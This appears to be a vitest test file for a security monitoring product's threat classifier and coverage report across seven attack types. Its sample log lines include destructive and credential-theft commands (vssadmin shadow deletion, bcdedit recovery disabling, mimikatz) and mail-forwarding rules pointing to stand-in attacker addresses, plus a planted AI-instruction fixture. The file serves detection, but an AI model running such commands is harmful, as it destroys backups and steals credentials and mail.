/**
 * The seven attack types: what each looks like in real log lines, what must
 * NOT trigger it, and the coverage verdict (detected / watching / blind).
 */
import { afterEach, describe, expect, it } from "vitest";
import { assessCoverage } from "../src/skills/coverage.js";
import { strongThreats, threatSigns, THREATS } from "../src/skills/threats.js";
import { TENANT_A } from "./helpers.js";
import { FakeData, skillEnv, type SkillTestEnv } from "./skills-fixtures.js";

const signIds = (t: string) => threatSigns(t).map((s) => s.id);

describe("what each attack looks like in the logs", () => {
  it.each([
    // Ransomware
    ["ransomware", "Process created: vssadmin.exe delete shadows /all /quiet", "shadow_copy_delete"],
    ["ransomware", "cmd.exe /c bcdedit /set {default} recoveryenabled No", "recovery_disabled"],
    ["ransomware", "wbadmin delete catalog -quiet", "recovery_disabled"],
    ["ransomware", "New file README_TO_DECRYPT.txt created in C:\\Users\\Public", "ransom_note"],
    ["ransomware", "Your files have been encrypted. Pay 2 BTC", "ransom_note"],
    ["ransomware", "EDR: mass file rename to .lockbit extension", "files_encrypted"],
    // Business email compromise
    ["bec", "Office 365: New-InboxRule -Name x -ForwardTo attacker@evil.example", "mail_forwarding"],
    ["bec", "Exchange: Set-Mailbox -ForwardingSmtpAddress smtp:pay@evil.example", "mail_forwarding"],
    ["bec", "Office 365: inbox rule created: move messages from 'bank' to RSS Feeds and mark as read", "mail_hiding_rule"],
    ["bec", "Azure AD: Consent to application 'Mail Sync Pro' by dana@acme.example", "oauth_consent"],
    ["bec", "User dana: MFA method removed (Authenticator app)", "mfa_removed"],
    ["bec", "ERP: vendor bank details changed for Acme Supplies Ltd", "payment_change"],
    // Phishing
    ["phishing", "Sysmon: WINWORD.EXE started powershell.exe -nop -w hidden", "office_spawned_script"],
    ["phishing", "Proxy: user dana clicked a malicious link hxxp://login-micros0ft.example", "malicious_link_click"],
    ["phishing", "Defender: malicious macro executed in invoice.docm", "macro_executed"],
    // DDoS
    ["ddos", "nginx: HTTP flood detected from 1,200 addresses", "flood"],
    ["ddos", "Firewall: SYN flood on port 443", "flood"],
    // AI deception
    ["ai_deception", "Helpdesk: caller used a cloned voice of the CFO to request a transfer", "impersonation"],
    ["ai_deception", "Email flagged: executive impersonation of the CEO", "impersonation"],
    // Espionage
    ["espionage", "Process created: mimikatz.exe sekurlsa::logonpasswords", "credential_dumping"],
    ["espionage", "DNS tunnel suspected: long TXT queries to x.example", "c2_beacon"],
    ["espionage", "Outbound beaconing every 60s to 45.155.205.12", "c2_beacon"],
    ["phishing", String.raw`{"win":{"eventdata":{"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","commandLine":"powershell -nop -w hidden","parentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}}}`, "office_spawned_script"],
    ["bec", '{"Operation":"New-InboxRule","UserId":"dana@acme.example","ResultStatus":"True","ClientIP":"45.155.205.12:52311","ObjectId":"EURPR01A001.prod.outlook.com/Microsoft Exchange Hosted Organizations/acme.onmicrosoft.com/dana/Inbox rule 1","Parameters":[{"Name":"AlwaysDeleteOutlookRulesBlob","Value":"False"},{"Name":"Force","Value":"False"},{"Name":"Name","Value":".."},{"Name":"ForwardTo","Value":"pay@evil.example"}]}', "mail_forwarding"],
    ["supply_chain", "New Yum package installed: openssl-libs; then: signature verification failed for openssl-libs", "integrity_failure"],
    // Supply chain
    ["supply_chain", "Windows: driver signature verification failed for update.sys", "integrity_failure"],
    ["supply_chain", "npm audit: malicious package event-stream-x detected (typosquatting)", "malicious_package"],
  ])("%s: %s", (threat, line, sign) => {
    expect(signIds(line)).toContain(sign);
    expect(strongThreats(line)).toContain(threat);
  });

  it.each([
    "sshd: Accepted publickey for deploy from 10.0.0.5",
    "Disk usage at 82% on /var",
    "User dana changed her display name",
    "Office 365: dana signed in",
    "Backup job finished: 120 GB copied to tape",
    "nginx: 200 GET /index.html",
    "Scheduled report emailed to finance@acme.example",
    "apt: package lists updated",
    "Windows Update: 3 updates downloaded",
    String.raw`{"win":{"eventdata":{"image":"C:\\Windows\\explorer.exe","parentImage":"C:\\Windows\\System32\\userinit.exe"}}}`,
    String.raw`{"win":{"eventdata":{"image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","parentImage":"C:\\Windows\\explorer.exe"}}}`,
    "User reported a suspicious email to IT (no click)",
  ])("ordinary line raises no strong sign: %s", (line) => {
    expect(strongThreats(line)).toEqual([]);
  });

  it("covers exactly the seven attack types", () => {
    expect([...THREATS]).toEqual(["ransomware", "bec", "phishing", "ddos", "ai_deception", "espionage", "supply_chain"]);
  });
});

describe("coverage: detected, watching, blind — said plainly", () => {
  const ev = (id: string, text: string) => ({ id, createdAt: new Date().toISOString(), text });

  it("no data at all: every type is blind except AI deception, which is always only partly visible", () => {
    const c = assessCoverage([]);
    expect(Object.fromEntries(c.map((x) => [x.threat, x.status]))).toEqual({
      ransomware: "blind", bec: "blind", phishing: "blind", ddos: "blind", ai_deception: "partial", espionage: "blind", supply_chain: "blind",
    });
    for (const x of c) expect(x.connect.length).toBeGreaterThan(20);
  });

  it("the right data arriving without signs is 'watching'; a sign is 'detected' with its evidence", () => {
    const c = Object.fromEntries(assessCoverage([
      ev("A1", "Integrity checksum changed for /etc/hosts"),
      ev("A2", "Office 365: dana signed in"),
      ev("A3", "Exchange: Set-Mailbox -ForwardingSmtpAddress smtp:pay@evil.example"),
      ev("A4", "nginx: 200 GET /"),
    ]).map((x) => [x.threat, x]));
    expect(c.ransomware!.status).toBe("watching");
    expect(c.ddos!.status).toBe("watching");
    expect(c.bec).toMatchObject({ status: "detected", detections: 1, eventIds: ["A3"], signs: [{ id: "mail_forwarding", count: 1 }] });
    expect(c.supply_chain!.status).toBe("blind");
  });

  it("text written to instruct an AI counts as AI deception, detected", () => {
    const c = assessCoverage([ev("I1", "Disk check")], { aiTextAttempts: ["I1"] }).find((x) => x.threat === "ai_deception")!;
    expect(c).toMatchObject({ status: "detected", detections: 1, eventIds: ["I1"] });
  });
});

let env: SkillTestEnv | undefined;
afterEach(async () => { await env?.t.pool.end(); env = undefined; });

describe("Guardian: threat_coverage skill", () => {
  it("reports the seven types over this tenant's events, and says where it is blind", async () => {
    const data = new FakeData();
    data.events = [
      ...data.events,
      { id: "R1", tenantId: TENANT_A, title: "Process created: vssadmin.exe delete shadows /all /quiet", severity: "critical", createdAt: new Date(Date.now() - 3_600_000).toISOString(), source: "wazuh", summary: "", asset: "fs-01" },
    ];
    env = await skillEnv({ data });
    await env.assign("threat_coverage");
    const r = await env.invoke("threat_coverage", {});
    expect(r.status).toBe(200);
    const by = Object.fromEntries(r.body.output.threats.map((t: { threat: string }) => [t.threat, t]));
    expect(Object.keys(by)).toHaveLength(7);
    expect(by.ransomware).toMatchObject({ status: "detected", eventIds: ["R1"] });
    // The default fixture includes a planted instruction (EINJ): AI deception is detected.
    expect(by.ai_deception.status).toBe("detected");
    expect(by.ai_deception.eventIds).toContain("EINJ");
    expect(r.body.output.blind).toEqual(expect.arrayContaining(["bec"]));
    expect(JSON.stringify(r.body)).not.toContain("Tenant B secret alert");
  });
});

describe("Legion's own alerts are not evidence for coverage", () => {
  it("a Legion alert that mentions a mailbox does not make BEC look watched, and its text is not a detection", async () => {
    const data = new FakeData();
    data.events = [{
      id: "OWN1", tenantId: TENANT_A, title: "Payment held: 12,500.00 EUR", severity: "high", createdAt: new Date().toISOString(), source: "legion-payments",
      summary: "A mailbox in your organisation shows takeover signs. Mail forwarded or redirected outside. Shadow copies deleted.",
    }];
    env = await skillEnv({ data });
    await env.assign("threat_coverage");
    const r = await env.invoke("threat_coverage", {});
    const by = Object.fromEntries(r.body.output.threats.map((t: { threat: string; status: string }) => [t.threat, t.status]));
    expect(by.bec).toBe("blind");
    expect(by.ransomware).toBe("blind");
    expect(r.body.output.eventsAnalyzed).toBe(0);
  });
});
